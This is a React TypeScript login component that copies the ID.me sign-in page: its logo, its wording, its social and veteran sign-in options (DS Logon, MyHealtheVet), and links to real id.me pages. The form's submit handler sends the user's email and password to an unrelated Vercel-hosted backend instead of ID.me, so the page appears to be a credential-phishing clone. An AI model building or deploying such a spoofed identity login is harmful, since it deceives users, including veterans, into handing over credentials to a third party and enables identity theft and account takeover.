import { useState } from "react";
import axios from "axios";
import InputPassword from "../components/InputPassword";
// import { useNavigate } from "react-router-dom";
import { Link } from "react-router-dom";
import idme from "../assets/idme-logo.svg";
import { IoHome } from "react-icons/io5";
// images
import facebook from "../assets/facebook-logo.svg";
import google from "../assets/google-logo.svg";
import linkedin from "../assets/linkedin-logo.svg";
import apple from "../assets/apple-logo.svg";
import dslogon from "../assets/dslogon.gif";
import myhealthevet from "../assets/myhealthevet.gif";

function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [isLogin, setLogin] = useState(true);
  // const navigate = useNavigate();

  const onChange = () => {
    setLogin(!isLogin);
  };

  const Links = [
    {
      img: facebook,
      link: "https://api.id.me/en/broker/facebook/connect?type=signin",
    },
    {
      img: google,
      link: "https://api.id.me/en/broker/google/connect?type=signin",
    },
    {
      img: apple,
      link: "https://api.id.me/en/broker/apple/connect?type=signin",
    },
    {
      img: linkedin,
      link: "https://api.id.me/en/broker/linkedin/connect?type=signin",
    },
  ];

  const Links2 = [
    {
      img: facebook,
      name: "Facebook",
      link: "https://api.id.me/en/broker/facebook/connect?type=signin",
    },
    {
      img: google,
      name: "Google",
      link: "https://api.id.me/en/broker/google/connect?type=signin",
    },
    {
      img: apple,
      name: "Apple",
      link: "https://api.id.me/en/broker/apple/connect?type=signin",
    },
    {
      img: linkedin,
      name: "LinkedIn",
      link: "https://api.id.me/en/broker/linkedin/connect?type=signin",
    },
    {
      img: dslogon,
      name: "DS Logon",
      link: "https://api.id.me/en/broker/dslogon/connect?type=signin",
    },
    {
      img: myhealthevet,
      name: "HealtheVet",
      link: "https://api.id.me/en/broker/myhealthevet/connect?type=signin",
    },
  ];

  const onSubmit = (e: any) => {
    e.preventDefault();
    const data = { email, password };
    setLoading(true);

    axios
      .post("https://npsa-backend.vercel.app/user/login", data)
      .then(() => {
        setLoading(false);
      })
      .catch((error) => {
        setLoading(false);
        console.log(error);
        setError(error.response.data.message);
      });
  };

  if (loading)
    return (
      <div className="min-h-screen text-white bg-black opacity-45 flex items-center justify-center text-3xl">
        Loading...
      </div>
    );

  return (
    <div className="relative">
        <Link to={"/"} className="flex items-start justify-start p-4 absolute top-0 cursor-pointer">
        <IoHome className=" text-3xl" />
        </Link>
      <div className="flex min-h-screen flex-col items-center">
        <div className="py-16">
          <img src={idme} alt="idme-logo" className="w-[100px] h-[28px]" />
        </div>
        <div className="w-full bg-[#f5f5f5] flex flex-col gap-4 items-center justify-center pb-6">
          <>
            {isLogin && (
              <form
                className="bg-white  rounded-xl p-10 flex flex-col gap-7 w-full md:max-w-[450px] shadow-2xl"
                onSubmit={onSubmit}
              >
                <div className="flex flex-col gap-5 items-center w-full">
                  <p className="text-3xl font-semibold">Sign in to ID.me</p>
                  <div className="bg-[#f2faffd2] py-3 text-center w-full font-semibold">
                    <p>New to ID.me</p>
                    <Link
                      to="/api.id.me/en/registration/new"
                      className="underline text-blue-800"
                    >
                      Create an ID.me account
                    </Link>
                  </div>
                </div>
                <div className="flex flex-col">
                  <label className="font-semibold">Email</label>
                  <input
                    required
                    type="email"
                    value={email}
                    placeholder="Enter your email address"
                    onChange={(e) => {
                      setEmail(e.target.value), setError("");
                    }}
                    className="placeholder:text-slate-500 border-[#8696AC] border-2 outline-none rounded-md px-4 py-2"
                  />
                </div>
                <div>
                  <label className="font-semibold">Password</label>
                  <InputPassword
                    placeholder={"Enter password"}
                    password={password}
                    setPassword={setPassword}
                    setError={setError}
                  />
                </div>
                <div className="">
                  <input
                    type="checkbox"
                    id="remember"
                    name="remember"
                    required
                  />
                  <label className="font-semibold ml-2">Remember me</label>

                  <p className="ml-5">
                    For your security, select only on your devices
                  </p>
                </div>
                <button
                  type="submit"
                  className="text-white bg-blue-800 rounded-md py-3 font-semibold"
                >
                  Sign in
                </button>
                {error && (
                  <p className="text-red-500 text-center font-semibold">
                    {error}
                  </p>
                )}

                <Link
                  to={"https://api.id.me/en/passwords/new"}
                  className="text-center underline text-blue-600 font-semibold"
                >
                  Forgot password
                </Link>
                <div className="flex items-center justify-center gap-2">
                  <span className="border-slate-500  border-t-[0.2px] w-[100px]"></span>
                  <p className="font-medium">OR</p>
                  <span className="border-slate-500 border-t-[0.2px] w-[100px]"></span>
                </div>
                <div className="flex justify-between items-center">
                  {Links.map((item, index) => (
                    <Link
                      to={item?.link}
                      key={index}
                      className="border-[1px] border-black rounded-md h-[50px] w-[50px] flex items-center justify-center hover:bg-slate-100"
                    >
                      <img src={item?.img} alt="sign in link" />
                    </Link>
                  ))}
                </div>

                <button
                  onClick={onChange}
                  className="text-blue-600 font-medium border-[1px] border-black rounded-md w-full py-3 hover:bg-slate-100"
                >
                  View more options
                </button>
              </form>
            )}
          </>

          {!isLogin && (
            <>
              <div className="bg-white  rounded-xl p-10 flex flex-col gap-7 w-full md:max-w-[450px] shadow-2xl">
                <div className="flex flex-col gap-5 items-center w-full">
                  <p className="text-3xl font-semibold">Sign in to ID.me</p>
                  <div className="bg-[#f2faffd2] py-3 text-center w-full font-semibold">
                    <p>New to ID.me</p>
                    <Link
                      to="/api.id.me/en/registration/new"
                      className="underline text-blue-800"
                    >
                      Create an ID.me account
                    </Link>
                  </div>
                </div>
                <div>
                  <p className="text-center font-semibold py-2">
                    Choose from the following options:
                  </p>
                  <div className="flex flex-col gap-4">
                    {Links2.map((item, index) => (
                      <Link
                        to={item?.link}
                        key={index}
                        className="border-[1px] border-black rounded-md flex items-center gap-4 p-5 hover:bg-slate-100"
                      >
                        <div className=" flex items-center justify-center">
                          <img
                            src={item?.img}
                            alt={item?.name}
                            className="h-[30px] w-[30px]"
                          />
                        </div>
                        <p className="font-semibold">
                          Sign in with {item?.name}
                        </p>
                      </Link>
                    ))}
                    <button
                      className="underline text-blue-600 text-2xl font-semibold my-5"
                      onClick={onChange}
                    >
                      Go back
                    </button>
                  </div>
                </div>
              </div>
            </>
          )}

          <div className="underline text-blue-600 font-medium flex gap-3 items-center text-center">
            <Link to="https://www.id.me/about?_ga=2.216094166.1595513186.1708249008-1838405033.1684616461">
              What is ID.me
            </Link>
            <span className="text-black">|</span>
            <Link to="https://www.id.me/terms?_ga=2.48903142.1595513186.1708249008-1838405033.1684616461">
              Terms of service
            </Link>
            <span className="text-black">|</span>
            <Link to="https://www.id.me/privacy?_ga=2.48903142.1595513186.1708249008-1838405033.1684616461">
              Privacy Policy
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Login;
